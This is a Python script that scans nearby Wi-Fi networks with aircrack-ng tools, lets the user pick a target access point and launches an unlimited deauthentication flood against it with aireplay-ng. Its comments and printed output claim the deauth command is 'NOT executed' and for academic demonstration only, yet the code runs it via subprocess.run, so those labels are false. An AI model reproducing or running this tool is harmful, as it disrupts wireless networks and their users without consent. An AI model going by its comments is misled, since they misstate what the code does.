import subprocess
import time
import csv
import sys
import os
from new import show_banner
# call banner
show_banner()
INTERFACE = "wlan0"
MON_INTERFACE = "wlan0mon"
CSV_FILE = "scan-01.csv"

# 1. Enable monitor mode
print("[*] Enabling monitor mode...")
subprocess.run(["sudo", "airmon-ng", "start", INTERFACE])

# 2. Start scanning
print("[*] Scanning Wi‑Fi networks...")
print("[*] Press CTRL+C to stop scanning and show results")

process = subprocess.Popen([
    "sudo",
    "airodump-ng",
    "--write", "scan",
    "--output-format", "csv",
    MON_INTERFACE
])

try:
    process.wait()
except KeyboardInterrupt:
    print("\n[*] Scan stopped by user")
    process.terminate()
    time.sleep(2)

# 3. Parse CSV
networks = []

if not os.path.exists(CSV_FILE):
    print("[-] No scan file found.")
    sys.exit(1)

with open(CSV_FILE, newline='', encoding="utf-8", errors="ignore") as f:
    reader = csv.reader(f)
    for row in reader:
        if len(row) > 13 and row[0] and row[0] != "BSSID":
            networks.append({
                "bssid": row[0].strip(),
                "channel": row[3].strip(),
                "power": row[8].strip(),
                "essid": row[13].strip()
            })

if not networks:
    print("[-] No networks found.")
    sys.exit(0)

# 4. Show available networks
print("\nAvailable Networks:\n")
for i, net in enumerate(networks, 1):
    print(f"{i}. ESSID: {net['essid']} | BSSID: {net['bssid']} | CH: {net['channel']}")

# 5. Select target
choice = int(input("\nSelect target number: ")) - 1
target = networks[choice]

bssid = target["bssid"]
channel = target["channel"]

print("\nSelected Network")
print("ESSID :", target["essid"])
print("BSSID :", bssid)
print("CH    :", channel)

# 6. Lock monitor interface to correct channel
print(f"[*] Setting {MON_INTERFACE} to channel {channel}...")
subprocess.run(["sudo", "iwconfig", MON_INTERFACE, "channel", channel])
time.sleep(1)

# 7. Deauthentication command (COMMENTED – DEMO ONLY)
# --------------------------------------------------
# NOTE:
# This command is shown for academic explanation only.
# It is intentionally NOT executed.

deauth_cmd = [
    "sudo",
    "aireplay-ng",
    "--deauth", "0",
    "-a", bssid,
    MON_INTERFACE,
    "--ignore-negative-one"
]
subprocess.run(deauth_cmd)
print("\n[INFO] Deauthentication command prepared (NOT executed)")
print("Command:")
print(" ".join(deauth_cmd))

# for managing mode on
try:
    subprocess.run(
        ["sudo", "airmon-ng", "stop", MON_INTERFACE],
        check=True
    )
    print(f"[+] Monitor mode disabled. {MON_INTERFACE} is back to managed mode.")
except subprocess.CalledProcessError:
    print("[-] Failed to stop monitor mode.")
    print("Make sure the interface exists and is in monitor mode.")